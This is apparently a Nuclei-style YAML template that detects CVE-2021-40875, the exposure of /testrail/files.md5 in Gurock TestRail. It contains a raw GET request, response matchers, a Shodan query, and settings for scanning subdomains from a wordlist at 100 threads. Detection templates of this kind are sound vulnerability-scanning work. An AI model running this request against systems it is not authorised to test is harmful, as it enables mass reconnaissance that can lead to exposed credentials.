id: CVE-2021-40875 1
info:
  author: oscarintherocks
  classification:
    cve-id: CVE-2021-40875
  description: Improper Access Control in Gurock TestRail versions < 7.2.0.3014 resulted
    in sensitive information exposure. A threat actor can access the /files.md5 file
    on the client side of a Gurock TestRail application, disclosing a full list of
    application files and the corresponding file paths. The corresponding file paths
    can be tested, and in some cases, result in the disclosure of hardcoded credentials,
    API keys, or other sensitive data.
  metadata:
    shodan-query: https://www.shodan.io/search?query=TestRail
  name: Gurock TestRail Application files.md5 exposure
  reference: https://github.com/SakuraSamuraii/derailed https://johnjhacking.com/blog/cve-2021-40875/
    https://www.gurock.com/testrail/tour/enterprise-edition https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40875
  severity: medium
  tags: cve,cve2021,exposure,gurock,testrail
requests:
- attack: sniper
  matchers:
  - part: body
    type: word
    words:
    - app/arguments/admin
  - status:
    - 200
    type: status
  matchers-condition: and
  max-size: 1000
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'GET /testrail/files.md5 HTTP/1.1

    Host: {{Subdomains}}

    Accept: */*

    '
  threads: 100
